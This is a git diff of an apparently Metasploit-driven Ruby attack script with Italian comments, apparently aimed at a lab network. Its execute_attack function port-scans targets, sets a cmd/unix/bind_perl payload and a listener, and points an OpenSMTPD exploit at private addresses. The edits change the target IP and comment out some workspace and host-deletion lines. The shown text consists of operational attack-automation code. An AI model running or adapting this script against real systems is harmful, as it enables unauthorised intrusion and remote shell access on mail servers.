@@ -73,13 +73,9 @@ def execute_attack(workspace, targetIPs, listeningIP)
     # si sposta nel workspace specificato come parametro,
     # se non esiste lo crea in automatico
     run_single("workspace -a #{workspace}")
-<<<<<<< HEAD
-    
-=======
-    run_single("workspace -d #{workspace}")
-    run_single("workspace -a #{workspace}")
-    run_single("hosts -d 192.168.40.22")
->>>>>>> 0d58cad9f2b4d8cc6e42927629652b492988adb6
+    #run_single("workspace -d #{workspace}")
+    #run_single("workspace -a #{workspace}")
+    #run_single("hosts -d 192.168.40.22")
     # PRE-EXPLOIT
     # seleziona come modulo attivo lo scanner di porte tcp
     run_single("use auxiliary/scanner/portscan/tcp")
@@ -108,7 +104,7 @@ def execute_attack(workspace, targetIPs, listeningIP)
     run_single("set payload cmd/unix/bind_perl")
     # imposta come obiettivo dell'exploit tutti i server opensmtpd
     #run_single("services -S opensmtpd -R")
-    run_single("set RHOSTS 192.168.40.21")
+    run_single("set RHOSTS 192.168.40.22")
     # imposta l'indirizzo ip su cui avviare il listener per la reverse shell
     run_single("set LHOST #{listeningIP}")
     # COMPATIBILITY MOD
@@ -164,7 +160,7 @@ def init_args
     datastore = framework.datastore
     args[:workspace] = ARGV.shift || datastore['DB_WORKSPACE'] || ''
     #args[:targetIPs] = ARGV.shift || datastore['TARGET'] || ''
-    args[:targetIPs] = '192.168.40.21'
+    args[:targetIPs] = '192.168.40.22'
     args[:listeningIP] = ARGV.shift || datastore['LISTENER'] || ''
     
     # verifico che tutti i parametri siano stati corretamente inizializzati
